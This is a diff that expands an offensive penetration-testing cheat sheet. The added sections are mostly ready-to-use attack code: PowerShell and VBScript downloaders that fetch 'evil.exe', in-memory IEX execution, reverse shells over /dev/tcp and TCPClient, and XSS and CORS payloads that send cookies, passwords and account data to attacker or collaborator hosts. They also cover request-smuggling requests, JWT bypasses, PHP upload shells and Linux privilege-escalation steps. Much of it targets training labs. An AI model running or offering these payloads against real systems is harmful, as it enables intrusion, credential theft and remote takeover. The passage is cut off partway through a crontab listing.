@@ -2704,8 +2704,128 @@ cd cheatsheet-pentesting
   ```
 - **File Transfers**:
   ```powershell
-  Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
+  #Powershell
+  #Creating a PowerShell HTTP downloader script
+  
+  echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+  echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
+  echo $file = "new-exploit.exe" >>wget.ps1
+  echo $webclient.DownloadFile($url,$file) >>wget.ps1
+  #Executing the PowerShell HTTP downloader script
+  powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+  
+  #Powershell
+  #One-liner
+  powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+  
+  #Powershell
+  #One-liner Executing a remote PowerShell script directly from memory
+  powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
+  Invoke-WebRequest -Uri "http://192.168.49.52/winPEASany.exe" -OutFile "winpeas.exe"
+  #Powershell
+  #Windows Downloads with exe2hex and PowerShell
+  #PowerShell command to rebuild nc.exe
+  upx -9 nc.exe
+  exe2hex -x nc.exe -p nc.cmd
+  
+  powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"
+  
+  
+  #Powershell
+  #PHP script to receive HTTP POST request
+  #PowerShell command to upload a file to the attacker machine
+  <?php
+  $uploaddir = '/var/www/uploads/';
+  
+  $uploadfile = $uploaddir . $_FILES['file']['name'];
+  
+  move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+  ?>
+  
+  powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.168/upload.php', 'important.docx')
   ```
+- **VBScript: Creating a VBScript HTTP downloader script**:
+  ```powershell
+  echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+  echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+  echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+  echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+  echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+  echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+  echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+  echo  Err.Clear >> wget.vbs
+  echo  Set http = Nothing >> wget.vbs
+  echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+  echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+  echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+  echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+  echo  http.Open "GET", strURL, False >> wget.vbs
+  echo  http.Send >> wget.vbs
+  echo  varByteArray = http.ResponseBody >> wget.vbs
+  echo  Set http = Nothing >> wget.vbs
+  echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+  echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+  echo  strData = "" >> wget.vbs
+  echo  strBuffer = "" >> wget.vbs
+  echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+  echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+  echo  Next >> wget.vbs
+  echo  ts.Close >> wget.vbs
+  
+  #VBScript
+  #Executing the VBScript HTTP downloader script
+  cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
+  ```
+- **File Transfers: FTP**:
+  ```powershell
+  #FTP
+  #Installing Pure-FTP on Kali
+  sudo apt update && sudo apt install pure-ftpd
+  
+  #FTP
+  #Bash script to setup Pure-FTP on Kali
+  #cat ./setup-ftp.sh
+  #!/bin/bash
+  sudo groupadd ftpgroup
+  sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+  sudo pure-pw useradd offsec -u ftpuser -d /ftphome
+  sudo pure-pw mkdb
+  cd /etc/pure-ftpd/auth/
+  sudo ln -s ../conf/PureDB 60pdb
+  sudo mkdir -p /ftphome
+  sudo chown -R ftpuser:ftpgroup /ftphome/
+  sudo systemctl restart pure-ftpd
+  
+  #FTP
+  #Creating the non-interactive FTP script
+  
+  echo open 10.11.0.4 21> ftp.txt
+  echo USER offsec>> ftp.txt
+  echo lab>> ftp.txt
+  echo bin >> ftp.txt
+  echo GET nc.exe >> ftp.txt
+  echo bye >> ftp.txt
+  
+  #FTP
+  #Using FTP non-interactively
+  ftp -v -n -s:ftp.txt
+
+  ```
+- **File Transfers: TFTP**:
+  ```powershell
+  #TFTP
+  #Setting up a TFTP server on Kali
+  kali@kali:~$ sudo apt update && sudo apt install atftp
+  kali@kali:~$ sudo mkdir /tftp
+  kali@kali:~$ sudo chown nobody: /tftp
+  kali@kali:~$ sudo atftpd --daemon --port 69 /tftp
+  
+  #TFTP
+  #Uploading files to our Kali machine using TFTP
+  tftp -i 10.11.0.4 put important.docx
+
+  ```
+
 - **Reverse Shell One-Liner**:
   ```powershell
   powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
@@ -3833,7 +3953,108 @@ cd cheatsheet-pentesting
   ```html
   <script>alert('XSS Attack');</script>
   ```
+- **XSS most known tricks and attacks**
+  ```html
+  #payloads
 
+  <iframe src="https://vulnearble-site.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>		//DOM XSS in jQuery selector sink using a hashchange event (Exploit-Server)
+  "onmouseover="alert(1)												
+  javascript:alert(1)
+  '-alert(1)-'
+  "></select><img%20src=1%20onerror=alert(1)>
+  {{$on.constructor('alert(1)')()}}							//AngularJS expression with angle brackets and double quotes HTML-encoded	
+  \"-alert(1)}//
+  \'-alert(1)//
+  </script><script>alert(1)</script>
+  foo?&apos;-alert(1)-&apos;
+  ${alert(1)}
+  
+  
+  #Cookie Straling: An XSS payload to steal cookies
+  <script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
+  
+  
+  #Exploit Server:
+  //1-PostMessages
+  <iframe src="https://0a1000080333edd5c0964033005400b9.web-security-academy.net/" onload=' this.contentWindow.postMessage("<img src=https://v62ftvfm3278074yfn9mdkh5iwoncd02.oastify.com/?cookie"+document.cookie+" onerror=alert(1); >"+document.cookie,"*") '>
+  <iframe src="https://0a1000080333edd5c0964033005400b9.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(1)>","*")'>
+  
+  //2-PostMessages
+  <iframe id="samFrame" img src="https://0a3a000c04aa33b7c1297603007500ac.web-security-academy.net/" width="640" height="640"></iframe>
+  
+  <script>
+  document.getElementById("samFrame").onload = function() {onloadFunct()};
+  
+  function onloadFunct  () {
+  document.getElementById("samFrame").contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:javascript:fetch('https://hzkzogy29vgtb605a6tk0j86xx3orff4.oastify.com/?cookie='+document.cookie)\"}","*");
+  }
+  
+  </script>
+  
+  #This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.					
+  <script>
+  fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+  method: 'POST',
+  mode: 'no-cors',
+  body:document.cookie
+  });
+  </script>
+  
+  #This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.
+  <input name=username id=username>
+  <input type=password name=password onchange="if(this.value.length)fetch('https://nrixqc1u2sdfnvl1am6p5sr6vx1opgd5.oastify.com',{
+  method:'POST',
+  mode: 'no-cors',
+  body:username.value+':'+this.value
+  });">
+  
+  #Exploiting XSS to perform CSRF
+  #This will make anyone who views the comment issue a POST request to change their email address to
+  <script>
+  var req = new XMLHttpRequest();
+  req.onload = handleResponse;
+  req.open('get','/my-account',true);
+  req.send();
+  function handleResponse() {
+      var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+      var changeReq = new XMLHttpRequest();
+      changeReq.open('post', '/my-account/change-email', true);
+      changeReq.send('csrf='+token+'&email=test@test.com')
+  };
+  </script>
+  
+  <xss id=x onfocus=alert(document.cookie) tabindex=1>#x';				//custom tags to bypass waf
+  <svg><animatetransform%20§§=1>								//cheat sheet check
+  "><svg><animatetransform%20onbegin=alert(1)>
+  
+  #Reflected XSS in canonical link tag(To assist with your exploit, you can assume that the simulated user will press the following key combinations: Alt+X CTRL+ALT+X) ALT+SHIFT+X
+  https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
+  
+  #XSS: Cookie redirect
+  <script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+  
+  #DOM XSS with postmessage
+  #ON the Exploit Server
+  <iframe src="https://0a19008a0387c880c0c74013009f0065.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+  
+  %3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
+  <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+  postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+  postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
+  search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+  search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27			//Bypassing CSP
+  Comment=<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
+  Comment=<form id=x tabindex=0 onfocus=print()><input id=attributes>
+  <img src=1 oNeRrOr=alert`1`>
+  <img src=1 onerror='alert(1)'>
+  
+  
+  #Using an iframe to deliver an XSS payload
+  <iframe src=http://10.11.0.4/report height="0" width="0"></iframe>
+  
+  #Using Netcat to receive a XSS request
+  sudo nc -nvlp 80
+  ```
 
 
 ### XML External Entity (XXE) / XML Payloads
@@ -4586,12 +4807,175 @@ cd cheatsheet-pentesting
   ```html
   <iframe src="http://target.com" width="100%" height="100%" style="opacity: 0.0; position: absolute;"></iframe>
   ```
+- **Basic clickjacking with CSRF token protection**:
+  ```html
+  <style>
+    iframe {
+        position:relative;
+        width:500;
+        height:700;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:510;
+        left:60;
+        z-index: 1;
+    }
+  </style>
+  <div>Click me</div>
+  <iframe src="https://0a9200ad03e0c2e7c013191100b1001b.web-security-academy.net/my-account"></iframe>
+  ```
+- **Exploiting clickjacking vulnerability to trigger DOM-based XSS**:
+  ```html
+  <iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
+  ```
 
 ### Cross-Origin Resource Sharing (CORS)
 - **CORS Example**:
   ```js
   fetch('http://malicious.com', { method: 'GET', headers: { 'Origin': 'http://malicious.com' } });
   ```
+- **CORS basic tricks**:
+  ```js
+  //Add origin Header
+  //Set the Origin Header to arbitrary value
+  //Set the Origin Header to null
+  //Set the Origin Header to subdomain
+  //Change the protocol to http or https
+  //Change the original to internal addresses like 127.0.0.1
+  ```
+- **CORS vulnerability with basic origin reflection**:
+  ```js
+  HTTP-Request: Header--> Origin: https://example.com
+  HTTP-Response:     Access-Control-Allow-Origin: https://example.com
+								     Access-Control-Allow-Credentials: true
+  ```
+- **CORS: Script for the exploit server**:
+  ```js
+  <script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','0aa50072035e6d8fc0ff0df10033008a.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+  </script>
+  ```
+- **CORS vulnerability with trusted null origin**:
+  ```js
+  Header--> origin:null
+  Exploit Server:
+  <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+      var req = new XMLHttpRequest();
+      req.onload = reqListener;
+      req.open('get','https://0a7200a804a067b4c0714fa20005009a.web-security-academy.net/accountDetails',true);
+      req.withCredentials = true;
+      req.send();
+      function reqListener() {
+          location='https://exploit-0ab5005f04b56781c0294f2101440051.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+      };
+  </script>"></iframe>
+  ```
+
+- **CORS vulnerability with trusted insecure protocols**:
+  ```js
+  Header --> origin: http://subdomain.lab-ib.burp.net
+  Exploit Server:
+  <script>
+      document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+  </script>
+  ```
+- **CORS vulnerability with internal network pivot attack**:
+  ```js
+  1-scan the local network for the endpoint.
+  <script>
+  var q = [], collaboratorURL = 'http://$collaboratorPayload';
+  
+  for(i=1;i<=255;i++) {
+  	q.push(function(url) {
+  		return function(wait) {
+  			fetchUrl(url, wait);
+  		}
+  	}('http://192.168.0.'+i+':8080'));
+  }
+  
+  for(i=1;i<=20;i++){
+  	if(q.length)q.shift()(i*100);
+  }
+  
+  function fetchUrl(url, wait) {
+  	var controller = new AbortController(), signal = controller.signal;
+  	fetch(url, {signal}).then(r => r.text().then(text => {
+  		location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
+  	}))
+  	.catch(e => {
+  		if(q.length) {
+  			q.shift()(wait);
+  		}
+  	});
+  	setTimeout(x => {
+  		controller.abort();
+  		if(q.length) {
+  			q.shift()(wait);
+  		}
+  	}, wait);
+  }
+  </script>
+  
+  2- Replace $ip with the IP address and port number retrieved from your collaborator interaction. Don't forget to add your Collaborator payload or exploit server URL again
+  <script>
+  function xss(url, text, vector) {
+  	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+  }
+  
+  function fetchUrl(url, collaboratorURL){
+  	fetch(url).then(r => r.text().then(text => {
+  		xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
+  	}))
+  }
+  
+  fetchUrl("http://$ip", "http://$collaboratorPayload");
+  </script>
+  3-Clear the code from stage 2 and enter the following code in the exploit server. Replace $ip with the same IP address and port number as in step 2 and don't forget to add your Collaborator payload or exploit server again
+  <script>
+  function xss(url, text, vector) {
+  	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+  }
+  
+  function fetchUrl(url, collaboratorURL){
+  	fetch(url).then(r=>r.text().then(text=>
+  	{
+  		xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
+  	}
+  	))
+  }
+  
+  fetchUrl("http://$ip", "http://$collaboratorPayload");
+  </script>
+  4-Read the source code retrieved from step 3 in your Collaborator interaction or on the exploit server log. You'll notice there's a form that allows you to delete a user. 
+  
+  <script>
+  function xss(url, text, vector) {
+  	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+  }
+  
+  function fetchUrl(url){
+  	fetch(url).then(r=>r.text().then(text=>
+  	{
+  	xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
+  	}
+  	))
+  }
+  
+  fetchUrl("http://$ip");
+  </script>
+  ```
+
 
 ### Cross-Site Request Forgery (CSRF)
 - **CSRF Example**:
@@ -4670,9 +5054,62 @@ curl http://example.com/image?filename=../../../../../etc/passwd%00.png
   ```
 
 ### File Upload
-- **File Upload Example**:
+- **File Upload: Intruder(Some useful extensions)**:
   ```html
-  <input type="file" name="file" />
+  .php
+  .jsp
+  .php5
+  .shtml
+  .php.jpg
+  .php5.jpg
+  %2Ephp
+  %2Ephp.jpg
+  %2Ephp%2Ejpg
+  .asp%00.jpg
+  .php%00.jpg
+  .p.phphp
+  .jpg.php
+  xC0x2Ephp
+  xC4xAEphp
+  xC0xAEphp
+  x2Ephp
+  xC0x2Ephp.jpg
+  xC4xAEphp.jpg
+  xC0xAEphp.jpg
+  x2Ephp.jpg
+  xC0x2Ephp
+  xC4xAEphp
+  xC0xAEphp
+  x2Ephp
+  ..%2fexploit.php
+  ..%2f..%2fexploit.php
+  .htaccess
+  ```
+- **File Upload: basic tricks**:
+  ```html
+  #Extension:
+  filename="../exploit.php"
+  filename="..%2fexploit.php"
+  filename="hi.php%00.jpg"
+  
+  #Magic Bytes
+  GIF89a;
+  
+  #Upload .htaccess
+  cat .htaccess 
+  AddType application/x-httpd-php .evil
+  --> upload php shell as cmd.evil
+    
+  #Exploit-Payload
+  
+  <?php echo file_get_contents('/home/carlos/secret'); ?>
+  <?php system('curl $(cat /home/carlos/secret).seaepqj8xtjbx8hbbz71kbz6oxuoie63.oastify.com'); ?>
+
+  ```
+- **File Upload: exiftool**:
+  ```html
+  exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+
   ```
 
 ### File Transfer Protocol (FTP)
@@ -4828,6 +5265,56 @@ curl http://example.com/image?filename=../../../../../etc/passwd%00.png
   ```bash
   curl -H "Host: victim.com" http://target.com
   ```
+- **Host Header Injection: Basic tricks**:
+  ```bash
+    Host: localhost					//to access /admin for example
+  Host: Exploit-Server.com			//to get the password reset link
+  
+  Host: localhost
+   Host: localhost
+  
+   Host: localhost
+  Host: localhost
+  
+  
+  GET https://URL/admin
+  Host: normal
+  
+  GET @private-intranet/example
+  Host: normal					//http://normal@private-intranet/example
+
+  ```
+- **Host Header Injection: Intruder basic lists**:
+  ```bash
+  # uncheck the option(Update the host header to match the target) in Intruder
+
+  localhost
+  127.0.0.1
+  127.1
+  localhost:6566
+  localhost@localhost
+  2130706433
+  017700000001
+  %6cocalhost
+  &#x6cocalhost
+  \u006Cocalhost
+  ```
+- **Host Header: Host override Header**:
+  ```bash
+  X-Host:
+  X-Forwarded-Server:
+  X-HTTP-Host-Override:
+  Forwarded:
+
+  ```
+- **Host Header Exploit Server (Web cache poisoning via ambiguous requests)**:
+  ```bash
+  fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+  method: 'POST',
+  mode: 'no-cors',
+  body:document.cookie
+  });
+  ```
 
 ### HTA (HTML Application)
 - **HTA Example**:
@@ -4885,9 +5372,143 @@ curl http://example.com/image?filename=../../../../../etc/passwd%00.png
   ```
 
 ### HTTP Request Smuggling
-- **HTTP Request Smuggling Example**:
+- **HTTP Request Smuggling most known tricks and attacks**:
   ```bash
-  curl -H "Transfer-Encoding: chunked" -H "Content-Length: 5" http://target.com
+  //Changing GET / Request to POST
+  //Adding Teansfer-Encoding or Content-Length Header
+  //duplicate the header
+  
+  
+  
+  //HTTP request smuggling, basic CL.TE vulnerability
+  
+  POST / HTTP/1.1
+  Host: YOUR-LAB-ID.web-security-academy.net
+  Connection: keep-alive
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 6
+  Transfer-Encoding: chunked
+  
+  0
+  
+  G
+  
+  
+  //HTTP request smuggling, basic TE.CL vulnerability
+  
+  POST / HTTP/1.1
+  Host: YOUR-LAB-ID.web-security-academy.net
+  Content-Type: application/x-www-form-urlencoded
+  Content-length: 4
+  Transfer-Encoding: chunked
+  
+  5c
+  GPOST / HTTP/1.1
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 15
+  
+  x=1
+  0
+  
+  //HTTP request smuggling, obfuscating the TE header
+  //This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.
+  
+  POST / HTTP/1.1
+  Host: YOUR-LAB-ID.web-security-academy.net
+  Content-Type: application/x-www-form-urlencoded
+  Content-length: 4
+  Transfer-Encoding: chunked
+  Transfer-encoding: cow
+  
+  5c
+  GPOST / HTTP/1.1
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 15
+  
+  x=1
+  0
+  
+  //HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
+  
+  POST / HTTP/1.1
+  Host: YOUR-LAB-ID.web-security-academy.net
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 35
+  Transfer-Encoding: chunked
+  
+  0
+  
+  GET /404 HTTP/1.1
+  X-Ignore: X
+  
+  //HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
+  POST / HTTP/1.1
+  Host: YOUR-LAB-ID.web-security-academy.net
+  Content-Type: application/x-www-form-urlencoded
+  Content-length: 4
+  Transfer-Encoding: chunked
+  
+  5e
+  POST /404 HTTP/1.1
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 15
+  
+  x=1
+  0
+  
+  //Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+  
+  POST / HTTP/1.1
+  Host: YOUR-LAB-ID.web-security-academy.net
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 139
+  Transfer-Encoding: chunked
+  
+  0
+  
+  GET /admin/delete?username=carlos HTTP/1.1
+  Host: localhost
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 10
+  
+  x=
+  
+  
+  
+  //Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+  
+  POST / HTTP/1.1
+  Host: YOUR-LAB-ID.web-security-academy.net
+  Content-length: 4
+  Transfer-Encoding: chunked
+  
+  87
+  GET /admin/delete?username=carlos HTTP/1.1
+  Host: localhost
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 15
+  
+  x=1
+  0
+  
+  
+  
+  //Exploiting HTTP request smuggling to deliver reflected XSS
+  
+  POST / HTTP/1.1
+  Host: YOUR-LAB-ID.web-security-academy.net
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 150
+  Transfer-Encoding: chunked
+  
+  0
+  
+  GET /post?postId=5 HTTP/1.1
+  User-Agent: a"/><script>alert(1)</script>
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 5
+  
+  x=1
   ```
 
 ### Internet Relay Chat (IRC)
@@ -4915,9 +5536,27 @@ curl http://example.com/image?filename=../../../../../etc/passwd%00.png
   ```
 
 ### JSON Web Token (JWT)
-- **JWT Example**:
+- **JWT basic tricks**:
   ```bash
-  curl -H "Authorization: Bearer <token>" http://target.com
+  // Change user to admin with the same signature(JWT authentication bypass via unverified signature)
+  // Change alg parameter to none(JWT authentication bypass via flawed signature verification)
+  // Crack the secret and rebuild the cookie (JWT authentication bypass via weak signing key)
+  	hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
+  //JWT Editor generate key and then embed a JWK via  JWT Attack to the header(JWT authentication bypass via jwk header injection)
+  //JWT authentication bypass via jku header injection:
+  			- Generate RSA JWT and add it to Exploit Server: 
+  				{
+     			 "keys": [
+  					//Here
+     				 ]
+  				}	
+  			- add jku param to the header: "jku": "https://exploit-0abb008004f147dbc0ca32a801f800ca.exploit-server.net/exploit"
+  			- change the kid header and sign the JWT
+  
+  //JWT authentication bypass via kid header path traversal
+  			- Generate JWT Assemteric key with k="AA==" /null Byte in base64
+  			- In JWT Cookie change the kid value to ../../../../../../../dev/null
+   			- Sign and send
   ```
 
 ### Local File Inclusion (LFI)
@@ -5125,15 +5764,508 @@ curl http://192.168.1.33/dashboard.php?show=pending/../../../../../etc/passwd
   ```
 
 ### Privilege Escalation Linux (LIN)
-- **Privilege Escalation LIN Example**:
+- **Privilege Escalation LIN most known tricks**:
   ```bash
-  sudo -u root id
+  #useful links
+  https://gtfobins.github.io/gtfobins/find/
+  
+  # Getting the version of the running operating system and architecture
+  cat /etc/issue
+  cat /etc/*-release
+  uname -a
+  
+  #Enumerate IP-Adresses
+  cat /etc/sysconfig/network-scripts/ifcfg-eth0 | grep IP
+  
+  #Getting a list of running processes on Linux
+  ps axu
+  
+  #Inspecting the cron log file
+  grep "CRON" /var/log/cron.log
+  
+  #Listing the full TCP/IP configuration on all available adapters on Linux
+  ip a
+  
+  #Printing the routes on Linux
+  /sbin/route
+  
+  #checking the writable permissions on /etc/apt/apt.conf.d
+  ls -ld /etc/apt/apt.conf.d
+  
+  
+  #Listing all active network connections on Linux
+  ss -anp
+  
+  
+  #Writable Directory
+  find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null
+  
+  
+  #discovering that this user can write to usr/local/bin.
+  find / -writable -type d -prune -o -name /home/chloe -prune -o -name /var/lib/gitea 2>/dev/null
+  
+  # Listing all cron jobs on Linux
+  ls -lah /etc/cron*
+  cat /etc/crontab
+  
+  # Listing all installed packages on a Debian Linux operating system
+  dpkg -l
+  
+  #Listing all world writable directories on Linux
+  find / -writable -type d 2>/dev/null
+  
+  #Caps
+  getcap -r / 2>/dev/null
+  
+  #Listing content of /etc/fstab and all mounted drives on Linux
+  cat /etc/fstab
+  mount
+  
+  #Listing all available drives using lsblk on Linux
+  /bin/lsblk
+  
+  #Listing loaded drivers on Linux
+  lsmod
+  
+  #Listing additional information about a module on Linux
+  /sbin/modinfo libata
+  
+  # Searching for SUID files on Linux
+  find / -perm -u=s -type f 2>/dev/null
+  find / -type f -perm -4200 2>/dev/null
+  
+  #Tools
+  #https://pentestmonkey.net/tools/audit/unix-privesc-check
+  ./unix-privesc-check standard > output.txt
+  
+  #Escalating privileges by editing /etc/passwd
+  openssl passwd evil -->Output: AK24fcSx2Il3I
+  echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
+  su root2 --> Root
+  
+  #Code-GCC Compile
+  gcc 43418.c -o exploit
+  
+  #Process monitoring
+  https://github.com/DominicBreuker/pspy/releases
+  
+  #Dumping Firefox Saved Passwords
+  find / -type f -user elliot 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"
+  
+  #SUID example
+  $ ./get-list
+  Which List do you want to open? [customers/employees]: employees;ls
+  $ ./get-list
+  Which List do you want to open? [customers/employees]: ../../etc/shadow #employees
+  
+  #df Example
+  
+  $ id
+  uid=1002(sysadmin) gid=1002(sysadmin) groups=1002(sysadmin),6(disk)
+  $ df -h
+  udev            1.9G     0  1.9G   0% /dev
+  tmpfs           390M  1.9M  388M   1% /run
+  /dev/sda5        20G  7.8G   11G  43% /
+  
+  $ debugfs /dev/sda5
+  debugfs:  cd /root/.ssh
+  debugfs:  cat id_rsa
+  
+  
+  #Cron-Job Example:
+  #The first thing we notice here is that the PATH variable is specified with a new directory added: /dev/shm.
+  #We also see a cronjob listed in the crontab file that executes netstat as the root user every minute, along with other commands. We'll note that the full path (/usr/bin/netstat) is not specified for this binary; 
+  #therefore, the system will search the PATH variable for the location of the binary.
+  
+  www-data@muddy:/$ cat /etc/crontab
+  cat /etc/crontab
+  ...
+  SHELL=/bin/sh
+  PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+  ...
+  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+  *  *    * * *   root    netstat -tlpn > /root/status && service apache2 status >> /root/status && service mysql status >> /root/status
+  ...
+  www-data@muddy:/$
+  
+  www-data@muddy:/$ cd /dev/shm
+  cd /dev/shm
+  www-data@muddy:/dev/shm$ cat <<EOF>> ./netstat
+  cat <<EOF>> ./netstat
+  > #!/bin/bash
+  #!/bin/bash
+  > /bin/bash -i >& /dev/tcp/192.168.118.14/4444 0>&1
+  /bin/bash -i >& /dev/tcp/192.168.118.14/4444 0>&1
+  > EOF
+  EOF
+  www-data@muddy:/dev/shm$ chmod +x netstat
+  chmod +x netstat
+  www-data@muddy:/dev/shm$ 
+  
+  #Other Cron example:
+  #As the service runs as root we can execute malicious commands via the apt package manager.
+  #We begin by checking the writable permissions on /etc/apt/apt.conf.d:
+  
+  cat /etc/crontab
+  
+  SHELL=/bin/bash
+  PATH=/sbin:/bin:/usr/sbin:/usr/bin
+  MAILTO=root
+  
+  # For details see man 4 crontabs
+  
+  # Example of job definition:
+  # .---------------- minute (0 - 59)
+  # |  .------------- hour (0 - 23)
+  # |  |  .---------- day of month (1 - 31)
+  # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
